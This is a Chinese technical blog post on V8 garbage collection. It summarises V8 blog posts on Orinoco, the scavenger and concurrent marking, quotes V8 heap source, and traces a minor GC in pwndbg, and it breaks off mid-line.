title="总结"></a>总结</h3><p>有过C或C++开发经验的童靴都知道，C/C++的动态内存（一般是堆内存）是通过malloc等函数手动申请，并交由Free等函数手动释放的，这就需要我们对我们申请的每一块内存负责。如果无限申请资源而不去使用并释放，那么堆内存将会被分配至耗尽浪费系统资源并产生性能问题。如果释放的时候并没有回收空间或者回收多次，或者指向空间的指针没有被置空，那么就可能会出现安全漏洞。</p><p>GC提供了这样一种机制，开发者无需关注这种动态内存的释放问题，具体的实现是通过程序设计语言处理引擎（比如v8）来管理无用对象的垃圾回收，从而大大减少了出bug或者安全漏洞的几率。</p><p>主流的GC算法分为两类，分别是搜索型算法和引用计数法，GC标记-清除算法与GC复制算法等等都需要搜索根，所以他们都属于搜索型算法。而引用计数法独树一帜，当计数为0时可以直接将其清除掉。</p><h2 id="实现篇"><a href="#实现篇" class="headerlink" title="实现篇"></a>实现篇</h2><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><h4 id="v8官方博客"><a href="#v8官方博客" class="headerlink" title="v8官方博客"></a>v8官方博客</h4><h5 id="free-garbage-collection"><a href="#free-garbage-collection" class="headerlink" title="free-garbage-collection"></a><a class="link"   href="https://v8.js.cn/blog/free-garbage-collection/" >free-garbage-collection<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2015-08-07</p><p>这里翻译有一些错误，应该翻译为空闲时垃圾回收，作者举的例子为在播放60 帧动画时仍存在idle period，可以利用这段空闲时间进行垃圾回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011143254090.png" alt="image-20211011143254090"></p><p>这里使用的垃圾回收思想为分代垃圾回收，新生代使用GC复制算法，而老年代为GC标记-清除算法，不压缩的好处是可以节省一些压缩的时间，坏处还是内存碎片化，分配空间困难等问题。</p><h5 id="jank-busters"><a href="#jank-busters" class="headerlink" title="jank-busters"></a><a class="link"   href="https://v8.js.cn/blog/jank-busters/" >jank-busters<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2015-10-30</p><p>实际上是对最大暂停时间的避免，主要采用了下面几种方式</p><ol><li>之前在分配大量ArrayBuffer 的场景下（例如基于WebGL的应用，WebGL是一个基于JS的3D绘图协议）对这些缓冲区的GC会使最大暂停时间不可避免的变长。此时采取的方式是在每次使用ArrayBuffer 时进行检查来判断是否使用，如果未使用则将其空间释放，这样是将统一处理折衷成了分散处理，每次使用缓冲区都要进行检查可能会影响性能。</li><li>众所周知v8与BLINK有各自的堆空间存放活动对象，当BLINK使用v8对象时，v8需要维护一个状态表去表示那些BLINK区引用的对象，使v8在GC时不去回收这些对象。还是像之前的场景一样，对于WebGL这种会产生大量缓冲区的协议，就需要维护大量这样的全局引用来管理其生命周期。幸运的是，传递给 WebGL 的对象通常只是传递而从未真正修改过，从而可以进行简单的逃逸分析。使用小数组作为参数的 WebGL 函数，可将这个参数数据复制到栈上，减缓GC压力。</li><li>通过并发线程共同处理GC过程。主要清理老年代（新生代的GC复制算法效率很高最大暂停时间很短）。</li></ol><h5 id="jank-busters-two：orinoco"><a href="#jank-busters-two：orinoco" class="headerlink" title="jank-busters-two：orinoco"></a><a class="link"   href="https://v8.js.cn/blog/orinoco/" >jank-busters-two：orinoco<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2016-04-12</p><p>v8团队新命名了代号为<em>Orinoco</em> 的垃圾回收器，Orinoco 基于这样的想法，即在没有严格的分代边界的情况下实现大部分并行和并发的垃圾回收器将减少垃圾回收的 jank 和内存消耗，同时提供高吞吐量。此次的博客主要的性能提升体现在以下三个方面。</p><ol><li>新生代的晋升与老年代的压缩之间没有依赖关系，因此 Orinoco 可以并行执行这些阶段。</li><li>GC复制算法以及压缩过程等都涉及到对象的移动，对象移动的过程中需要更新指向该对象的指针。之前的做法是新生代和每个老年代都维护一个指向该区域的指针列表，但是这样可能会有重复条目的指针，这样多线程操作的时候可能会导致数据争用。改进的方式是对堆空间维护一个标志位区域。指向其他空间的指针位置在其标志位对应处置1，代表该位置有指向其他区域的指针。</li><li>将老年代中分配的所有对象涂黑，这样GC的整个过程都不会操作他们。因为老年代的含义就是比较稳定的对象，所以这个逻辑并没有什么问题。而最终在合适的时机进行老年代对象的垃圾回收。</li></ol><h5 id="Orinoco：新生代垃圾回收"><a href="#Orinoco：新生代垃圾回收" class="headerlink" title="Orinoco：新生代垃圾回收"></a><a class="link"   href="https://v8.js.cn/blog/orinoco-parallel-scavenger/" >Orinoco：新生代垃圾回收<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2017-11-29</p><p>新生代的垃圾回收方式一般为GC复制算法，但是在多线程环境中对GC复制算法的实现是一个问题。</p><p>V8 将其托管堆（managed heap）分成几代，其中对象最初在新生代（young generation）的“区域（nursery）”中分配。在垃圾回收中幸存下来后，对象被复制到中间代（intermediate generation），它仍然是新生代的一部分。在另一次垃圾回收中幸存下来后，这些对象被移动到老年代（old generation）（见图 1）。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011181346083.png" alt="image-20211011181346083"></p><p>文章中介绍了三种新生代使用的GC复制算法</p><ol><li>单线程的GC复制算法。在v6.2之前v8使用的是Cheney的GC复制算法。也就是利用迭代方式实现的。基本和算法篇的描述一致。单线程Cheney算法最初设计时考虑到了最优的单核性能。但从那时起，时代变了。即使在低端的移动设备上，CPU内核也是有很大提升。更重要的是，这些内核通常都是正常运行的。为了充分利用这些内核，V8垃圾收集器必须进行现代化改造。</li><li>并行 Mark-Evacuate。多个线程同时进行新生代对象的复制，这时就需要将对象进行标记，复制完成后将对象取消标记，此时不可避免地to空间会碎片化，这时最后进行压缩的操作。并行标记最大优点是可以确切标记的活动对象。可以通过移动和重链接包含活动对象的页面来避免复制，这些活动对象也是由完整的Mark-Sweep-Compact收集器执行的。然而，在实践中，这在综合基准测试中很常见，很少出现在真正的网站上。并行并行标记的缺点是执行三个单独的锁步阶段的开销。当在堆上调用垃圾收集器时，这种开销尤其明显，堆上的对象大多是死对象，这是许多实际web页面的情况。</li><li>并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。</li></ol><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011181632340.png" alt="image-20211011181632340"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011203736935.png" alt="image-20211011203736935"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011203803245.png" alt="image-20211011203803245"></p><h5 id="Tracing-from-JS-to-the-DOM-and-back-again"><a href="#Tracing-from-JS-to-the-DOM-and-back-again" class="headerlink" title="Tracing from JS to the DOM and back again"></a><a class="link"   href="https://v8.js.cn/blog/tracing-js-dom/" >Tracing from JS to the DOM and back again<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2018-03-01</p><p>功能：Chrome 66以后的版本可以在DevTools中追踪跨v8对象与DOM对象的访问。</p><p>背景：当由于忘记释放无意申请的空间时将会发生内存泄露，原始的DevTools无法跨DOM追踪到js代码，新增的该功能可以更精确的定位到发生泄露的具体对象或函数。</p><p>此时只第一行精准定位到了global_cariable</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011104502343.png" alt="image-20211011104502343"></p><p>此时追踪到了v8的EventListener函数</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011105551582.png" alt="image-20211011105551582"></p><h5 id="并发标记"><a href="#并发标记" class="headerlink" title="并发标记"></a><a class="link"   href="https://v8.js.cn/blog/concurrent-marking/" >并发标记<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2018-06-11</p><p>为了减少stop-the-world的问题采用了增量垃圾回收（三色标记法），V8 使用 Dijkstra 风格的写屏障（write-barrier）机制来解决标记遗漏的问题，但我们也说过，加入写屏障势必降低应用程序的吞吐量，所以可以通过增加线程的方式来处理这个问题，主要方式为并行和并发。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011113051287.png" alt="image-20211011113051287"></p><p>然而最终，主线程通过扫描 root 并填充标记工作表来启动标记。之后，它会在工作线程中发布并发标记任务。工作线程通过合作排除标记工作表来帮助主线程加快标记进度。偶尔主线程通过处理 bailout worklist 和标记工作表来参与标记。标记工作表变空之后，主线程完成垃圾收集。在最终确定期，主线程重新扫描 root，可能会发现更多的白色对象。这些对象在工作线程的帮助下被并行标记。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011141818684.png" alt="image-20211011141818684"></p><h5 id="2019年更新的Orinoco讨论"><a href="#2019年更新的Orinoco讨论" class="headerlink" title="2019年更新的Orinoco讨论"></a><a class="link"   href="https://v8.js.cn/blog/trash-talk/" >2019年更新的Orinoco讨论<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2019-01-03</p><p>相当于对之前提到的技术进行总结。</p><p>v8宏观上采用了分代垃圾回收的技术。基于的理论是代际假说（The Generational Hypothesis）；代际假说表明很多对象在刚刚分配后随即就释放掉了。新生代使用了前面提到的并行Scavenger技术，核心是GC复制算法。老年代使用了GC标记-清除算法。至于整理，v8采用了一种叫做碎片启发式（fragmentation heuristic）的算法来整理内存页。由于分配内存空间给很多常驻内存（ long-living）的对象时，复制这些对象会带来很高的成本。所以v8只选择整理碎片化比较严重的内存页，并且对其他内存页只进行清除而不是也同样复制活动对象。</p><p>v8中采用了并行垃圾回收、并发垃圾回收、增量式垃圾回收、空闲时回收等方式大大提升了v8的性能。前面也都提到过相关的技术。</p><p><a class="link"   href="https://v8.js.cn/blog/orinoco-parallel-scavenger" >Scavenger 回收器<i class="fas fa-external-link-alt"></i></a>将新生代的垃圾回收时间减少了大约 20% - 50%，<a class="link"   href="https://v8.js.cn/blog/free-garbage-collection" >空闲时垃圾回收器<i class="fas fa-external-link-alt"></i></a>在 Gmail 网页应用空闲的时候将 JavaScript 堆内存减少了 45%。<a class="link"   href="https://v8.js.cn/blog/jank-busters" >并发标记清理<i class="fas fa-external-link-alt"></i></a>可以减少大型 WebGL 游戏的主线程暂停时间，最多可以减少 50%。</p><p>最后提到了BLINK本身也是有一个垃圾收集器叫做Olipan，此时Orinoco尚未与其进行联动。</p><h5 id="high-performance-cpp-gc"><a href="#high-performance-cpp-gc" class="headerlink" title="high-performance-cpp-gc"></a><a class="link"   href="https://v8.js.cn/blog/high-performance-cpp-gc/" >high-performance-cpp-gc<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2020-05-26</p><p>启用Oilpan项目的目的是为了用于管理 C++ 内存（因为BLINK引擎对象使用C++实现），该内存可以使用<a class="link"   href="https://research.google/pubs/pub47359/" >跨组件跟踪<i class="fas fa-external-link-alt"></i></a>连接到 V8，该组件将耦合的 C++/JavaScript 对象图视为一个堆（heap）。 Blink 中实现了 Oilpan，但以<a class="link"   href="https://chromium.googlesource.com/v8/v8.git/+/HEAD/include/cppgc/" >垃圾收集库<i class="fas fa-external-link-alt"></i></a>的形式迁移到了 V8。目标是使所有 V8 嵌入程序和更多的 C++ 开发人员都可以轻松使用 C ++ 垃圾回收。</p><p>目前Oilpan的定位相当于一个C++对象回收的模块库，任何项目都可调用。在v8中是与Orinoco配合使用，虽然功能重合，但是Oilpan可以对C++进行GC。</p><p>在目前的文章中介绍的是Oilpan的GC标记-清除算法。在标记阶段实现了并发标记。对于清除阶段，使用了增量与并发清除技术。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// incremental-marking.cc并发标记根索引的对象，将对象涂灰并压入处理栈</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IncrementalMarkingRootMarkingVisitor</span> :</span> <span class="keyword">public</span> RootVisitor &#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VisitRootPointer</span><span class="params">(Root root, <span class="keyword">const</span> <span class="keyword">char</span>* description,</span></span></span><br><span class="line"><span class="params"><span class="function">                        FullObjectSlot p)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MarkObjectByPointer</span>(p);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">MarkObjectByPointer</span><span class="params">(FullObjectSlot p)</span> </span>&#123;</span><br><span class="line">    Object obj = *p;</span><br><span class="line">    <span class="keyword">if</span> (!obj.<span class="built_in">IsHeapObject</span>()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    heap_-&gt;<span class="built_in">incremental_marking</span>()-&gt;<span class="built_in">WhiteToGreyAndPush</span>(HeapObject::<span class="built_in">cast</span>(obj));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Heap* heap_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental-marking-inl.hWhiteToGreyAndPush函数如名字，将区涂灰并压栈，再往下跟没有意义了</span></span><br><span class="line">MarkCompactCollector* <span class="keyword">const</span> collector_;</span><br><span class="line"><span class="function">MarkingWorklists::Local* <span class="title">local_marking_worklists</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> collector_-&gt;<span class="built_in">local_marking_worklists</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IncrementalMarking::WhiteToGreyAndPush</span><span class="params">(HeapObject obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">marking_state</span>()-&gt;<span class="built_in">WhiteToGrey</span>(obj)) &#123;</span><br><span class="line">    <span class="built_in">local_marking_worklists</span>()-&gt;<span class="built_in">Push</span>(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental-marking.cc将对象涂黑</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IncrementalMarking::MarkBlackBackground</span><span class="params">(HeapObject obj, <span class="keyword">int</span> object_size)</span> </span>&#123;</span><br><span class="line">  MarkBit mark_bit = <span class="built_in">atomic_marking_state</span>()-&gt;<span class="built_in">MarkBitFrom</span>(obj);</span><br><span class="line">  Marking::MarkBlack&lt;AccessMode::ATOMIC&gt;(mark_bit);</span><br><span class="line">  MemoryChunk* chunk = MemoryChunk::<span class="built_in">FromHeapObject</span>(obj);</span><br><span class="line">  <span class="built_in">IncrementLiveBytesBackground</span>(chunk, <span class="keyword">static_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(object_size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap\incremental-marking.cc这个是上面官方博客提到的优化措施，将老年代的所有对象涂黑，这样可以一定程度上减缓GC的压力</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IncrementalMarking::EnsureBlackAllocated</span><span class="params">(Address allocated, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">black_allocation</span>() &amp;&amp; allocated != kNullAddress) &#123;</span><br><span class="line">    HeapObject object = HeapObject::<span class="built_in">FromAddress</span>(allocated);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">marking_state</span>()-&gt;<span class="built_in">IsWhite</span>(object) &amp;&amp; !Heap::<span class="built_in">InYoungGeneration</span>(object)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (heap_-&gt;<span class="built_in">IsLargeObject</span>(object)) &#123;</span><br><span class="line">        <span class="built_in">marking_state</span>()-&gt;<span class="built_in">WhiteToBlack</span>(object);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Page::<span class="built_in">FromAddress</span>(allocated)-&gt;<span class="built_in">CreateBlackArea</span>(allocated,</span><br><span class="line">                                                      allocated + size);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GC reason</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// heap.h枚举了需要用到GC的情况，可以以此为入口点全局搜索字符串来找到所有用到GC的情况。头文件2600行我淦</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">GarbageCollectionReason</span> &#123;</span></span><br><span class="line">  kUnknown = <span class="number">0</span>,</span><br><span class="line">  kAllocationFailure = <span class="number">1</span>,</span><br><span class="line">  kAllocationLimit = <span class="number">2</span>,</span><br><span class="line">  kContextDisposal = <span class="number">3</span>,</span><br><span class="line">  kCountersExtension = <span class="number">4</span>,</span><br><span class="line">  kDebugger = <span class="number">5</span>,</span><br><span class="line">  kDeserializer = <span class="number">6</span>,</span><br><span class="line">  kExternalMemoryPressure = <span class="number">7</span>,</span><br><span class="line">  kFinalizeMarkingViaStackGuard = <span class="number">8</span>,</span><br><span class="line">  kFinalizeMarkingViaTask = <span class="number">9</span>,</span><br><span class="line">  kFullHashtable = <span class="number">10</span>,</span><br><span class="line">  kHeapProfiler = <span class="number">11</span>,</span><br><span class="line">  kTask = <span class="number">12</span>,</span><br><span class="line">  kLastResort = <span class="number">13</span>,</span><br><span class="line">  kLowMemoryNotification = <span class="number">14</span>,</span><br><span class="line">  kMakeHeapIterable = <span class="number">15</span>,</span><br><span class="line">  kMemoryPressure = <span class="number">16</span>,</span><br><span class="line">  kMemoryReducer = <span class="number">17</span>,</span><br><span class="line">  kRuntime = <span class="number">18</span>,</span><br><span class="line">  kSamplingProfiler = <span class="number">19</span>,</span><br><span class="line">  kSnapshotCreator = <span class="number">20</span>,</span><br><span class="line">  kTesting = <span class="number">21</span>,</span><br><span class="line">  kExternalFinalize = <span class="number">22</span>,</span><br><span class="line">  kGlobalAllocationLimit = <span class="number">23</span>,</span><br><span class="line">  kMeasureMemory = <span class="number">24</span>,</span><br><span class="line">  kBackgroundAllocationFailure = <span class="number">25</span>,</span><br><span class="line">  <span class="comment">// If you add new items here, then update the incremental_marking_reason,</span></span><br><span class="line">  <span class="comment">// mark_compact_reason, and scavenge_reason counters in counters.h.</span></span><br><span class="line">  <span class="comment">// Also update src/tools/metrics/histograms/enums.xml in chromium.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap.cc搜索GarbageCollectionReason::kRuntime，定位到该函数，首先以原子方式完成增量标记，之后精确的回收全部的垃圾。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Heap::PreciseCollectAllGarbage</span><span class="params">(<span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    GarbageCollectionReason gc_reason,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="keyword">const</span> GCCallbackFlags gc_callback_flags)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">incremental_marking</span>()-&gt;<span class="built_in">IsStopped</span>()) &#123;</span><br><span class="line">    <span class="built_in">FinalizeIncrementalMarkingAtomically</span>(gc_reason);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">CollectAllGarbage</span>(flags, gc_reason, gc_callback_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后动态调试追踪一下这个函数，我们使用如下代码触发Minor GC</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123; a[i] = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><p>函数原型如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Heap::CollectGarbage</span><span class="params">(AllocationSpace space,</span></span></span><br><span class="line"><span class="params"><span class="function">                          GarbageCollectionReason gc_reason,</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">const</span> v8::GCCallbackFlags gc_callback_flags)</span> </span></span><br></pre></td></tr></table></figure><p>下断点进行调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">b v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)</span><br><span class="line"></span><br><span class="line"># 可以打印出参数信息以及函数调用栈，可以发现gc_reason为kAllocationFailure，当我们申请太多对象时如果空闲空间不够了则需要对堆空间进行垃圾回收</span><br><span class="line">pwndbg&gt; print space</span><br><span class="line">$1 = v8::internal::NEW_SPACE</span><br><span class="line">pwndbg&gt; print gc_reason</span><br><span class="line">$2 = v8::internal::GarbageCollectionReason::kAllocationFailure</span><br><span class="line">pwndbg&gt; print gc_callback_flags</span><br><span class="line">$3 = v8::kNoGCCallbackFlags</span><br><span class="line">pwndbg&gt; k</span><br><span class="line">#0  v8::internal::Heap::CollectGarbage (this=0x27d000009ee0, space=v8::internal::NEW_SPACE, gc_reason=v8::internal::GarbageCollectionReason::kAllocationFailure, gc_callback_flags=v8::kNoGCCallbackFlags) at ../../src/heap/heap.cc:1527</span><br><span class="line">#1  0x00007fc24d083295 in v8::internal::Heap::AllocateRawWithLightRetrySlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5090</span><br><span class="line">#2  0x00007fc24d0833eb in v8::internal::Heap::AllocateRawWithRetryOrFailSlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5106</span><br><span class="line">#3  0x00007fc24d03be1b in v8::internal::Heap::AllocateRawWith&lt;(v8::internal::Heap::AllocationRetryMode)1&gt; (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap-inl.h:310</span><br><span class="line">#4  0x00007fc24d0234c5 in v8::internal::Factory::NewFillerObject (this=0x27d000000000, size=16, double_align=false, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode) at ../../src/heap/factory.cc:299</span><br><span class="line">#5  0x00007fc24d851183 in v8::internal::__RT_impl_Runtime_AllocateInYoungGeneration (args=..., isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:393</span><br><span class="line">#6  0x00007fc24d850aa0 in v8::internal::Runtime_AllocateInYoungGeneration (args_length=2, args_object=0x7ffe42bb58d0, isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:373</span><br><span class="line">#7  0x00007fc24c62937f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">#8  0x00007fc24c7482b1 in Builtins_StringConstructor () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">#9  0x00007fc24c365461 in Builtins_JSBuiltinsConstructStub () from /root/v8/v8/v8/out/x64.debug/libv8.so</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> ► 1534   DevToolsTraceEventScope devtools_trace_event_scope(</span><br><span class="line">   1535       this, IsYoungGenerationCollector(collector) ? &quot;MinorGC&quot; : &quot;MajorGC&quot;,</span><br><span class="line">   1536       GarbageCollectionReasonToString(gc_reason));</span><br><span class="line">pwndbg&gt; print IsYoungGenerationCollector(collector)</span><br><span class="line">$5 = true</span><br><span class="line">pwndbg&gt; print collector</span><br><span class="line">$6 = v8::internal::SCAVENGER</span><br><span class="line"># 这里可以验证使用的GC方式为MinorGC</span><br><span class="line"># 之后调用了v8::internal::Heap::PerformGarbageCollection函数来执行垃圾收集的工作，在该函数中依次调用了  tracer()-&gt;StartInSafepoint();GarbageCollectionPrologueInSafepoint(); EnsureFromSpaceIsCommitted();等函数做一些前置准备，之后进行判断</span><br><span class="line">  switch (collector) &#123;</span><br><span class="line">    case MARK_COMPACTOR:</span><br><span class="line">      MarkCompact();</span><br><span class="line">      break;</span><br><span class="line">    case MINOR_MARK_COMPACTOR:</span><br><span class="line">      MinorMarkCompact();</span><br><span class="line">      break;</span><br><span class="line">    case SCAVENGER:</span><br><span class="line">      Scavenge();</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line"># 很明显这次进入了Scavenge()执行。</span><br><span class="line">void Heap::Scavenge() &#123;</span><br><span class="line">  ...</span><br><span class="line">  // Implements Cheney&#x27;s copying algorithm</span><br><span class="line">  LOG(isolate_, ResourceEvent(&quot;scavenge&quot;, &quot;begin&quot;));</span><br><span class="line"></span><br><span class="line">  scavenger_collector_-&gt;CollectGarbage();</span><br><span class="line"></span><br><span class="line">  LOG(isolate_, 